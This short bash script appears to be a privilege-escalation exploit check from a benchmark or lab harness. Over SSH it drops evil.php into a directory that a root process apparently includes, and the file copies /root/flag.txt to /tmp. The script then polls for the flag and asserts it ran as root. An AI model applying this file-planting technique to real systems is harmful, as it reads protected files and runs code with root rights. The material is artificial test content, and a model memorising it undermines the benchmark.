#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/php_flag
cat > /opt/bench/phpinc/evil.php <<'\''EOF'\''
<?php file_put_contents("/tmp/php_flag", file_get_contents("/root/flag.txt"));
EOF
for i in $(seq 1 45); do
  if test -r /tmp/php_flag && grep -q FLAG /tmp/php_flag 2>/dev/null; then
    cat /tmp/php_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
